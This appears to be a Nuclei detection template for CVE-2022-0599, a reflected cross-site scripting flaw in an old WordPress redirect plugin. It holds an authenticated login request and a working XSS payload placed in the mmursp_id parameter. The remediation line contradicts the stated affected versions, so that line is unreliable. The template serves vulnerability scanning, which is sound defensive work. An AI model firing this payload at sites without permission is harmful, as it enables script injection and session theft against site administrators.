http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(header_2, "text/html")
    type: dsl
  - part: body
    type: word
    words:
    - id="mmursp_id" value="\"><svg/onload=alert(document.domain)>" />
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin.php?page=mmursp-list&view=edit&mmursp_id="><svg/onload=alert(document.domain)>
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-0599
info:
  author: scent2d
  classification:
    cpe: cpe:2.3:a:mapping_multiple_urls_redirect_same_page_project:mapping_multiple_urls_redirect_same_page:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-0599
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.81288
    epss-score: 0.01606
  description: 'WordPress Mapping Multiple URLs Redirect Same Page plugin 5.8 and
    prior contains a reflected cross-site scripting vulnerability. It does not sanitize
    and escape the mmursp_id parameter before outputting it back in an admin page.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to potential session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: mapping_multiple_urls_redirect_same_page
    vendor: mapping_multiple_urls_redirect_same_page_project
  name: WordPress Mapping Multiple URLs Redirect Same Page <=5.8 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/4f1d45bc-d3bd-472c-959d-05abeff32765
  - https://wordpress.org/plugins/mapping-multiple-urls-redirect-same-page/
  - https://nvd.nist.gov/vuln/detail/cve-2022-0599
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Update to the latest version of the WordPress Mapping Multiple URLs
    Redirect Same Page plugin (version 5.8 or higher) to mitigate this vulnerability.

    '
  severity: medium
  tags: cve,cve2022,wordpress,wp-plugin,xss,wp,authenticated,wpscan,mapping_multiple_urls_redirect_same_page_project,vuln
